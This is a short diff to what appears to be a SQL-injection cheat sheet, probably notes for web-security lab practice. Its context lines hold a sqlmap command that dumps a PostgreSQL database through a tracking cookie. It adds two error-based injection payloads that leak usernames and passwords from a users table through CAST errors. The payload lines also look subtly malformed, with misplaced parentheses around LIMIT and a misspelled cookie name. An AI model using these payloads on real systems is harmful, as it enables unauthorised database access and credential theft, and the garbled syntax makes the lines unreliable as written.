@@ -100,6 +100,11 @@
 
 - __`sqlmap -u '<url>' --cookie='Trackingid=<id_value>; session=<value>' --level2 --dbms=postgreSQL --dump --threads=5`__
 
+## Visible error based SQL Injection
+
+- __`Cookie: TrackinId=' AND 1=CAST((SELECT username from users) LIMIT 1) AS int)--;`__
+- __`Cookie: TrackinId=' AND 1=CAST((SELECT password from users) LIMIT 1) AS int)--;`__
+
 
 ## Bypass XML encoding
 
